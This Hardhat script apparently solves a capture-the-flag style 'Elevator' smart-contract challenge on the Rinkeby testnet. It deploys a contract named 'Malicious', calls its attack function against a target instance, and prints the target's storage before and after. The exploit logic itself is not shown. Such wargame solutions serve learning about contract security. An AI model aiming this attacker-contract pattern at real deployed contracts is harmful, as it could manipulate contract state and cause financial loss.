/* eslint-disable space-before-function-paren */
/* eslint-disable no-undef */
const hre = require('hardhat');
const { chalk } = require('chalk')
const {deployed} = require('./deployed')
const INSTANCE = "0xF3A42653ddB0Cd7E33aA877e000693FfA893C830"


async function instanceState(rinkeby) {
  console.log('\n                          INSTANCE STATE')
  console.log("Elevator -> Storage '0'", await rinkeby.getStorageAt(INSTANCE, 0))
  console.log("Elevator -> Storage '1'", await rinkeby.getStorageAt(INSTANCE, 1), '\n')
}

async function main() {
  console.log("Initialisation")
  const [deployer] = await ethers.getSigners();
  const rinkeby = ethers.getDefaultProvider('rinkeby')

  let Elevator = await hre.ethers.getContractFactory('Elevator')
  let elevator = await Elevator.attach(INSTANCE)
  

  // STEP 1
  // Deploy our malicious contract that will serve as interface for Elevator.sol
  //-------------------------------------------------------------------------------
  console.log("\nSTEP 1")
  console.log("Deploying our malicious contract...")
  let Building = await hre.ethers.getContractFactory('Malicious')
  let building = await Building.deploy(INSTANCE)
  
  await building.deployed()
  
  await deployed("Building", hre.network.name, building.address)
  //-------------------------------------------------------------------------------
  

  await instanceState(rinkeby)

  
  // STEP 2
  // call attack from our malicious contract with (choose any numbers)
  // as our parameter to hack Elevator.sol
  //-------------------------------------------------------------------------------
  console.log("\nSTEP 2")
  console.log("Hack elevator.sol...")
  const tx = await building.attack(1)
  await tx.wait()
  console.log("Transaction valided !")
  //-------------------------------------------------------------------------------
  

  await instanceState(rinkeby)


  console.log("\nYou win !")
 }


main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
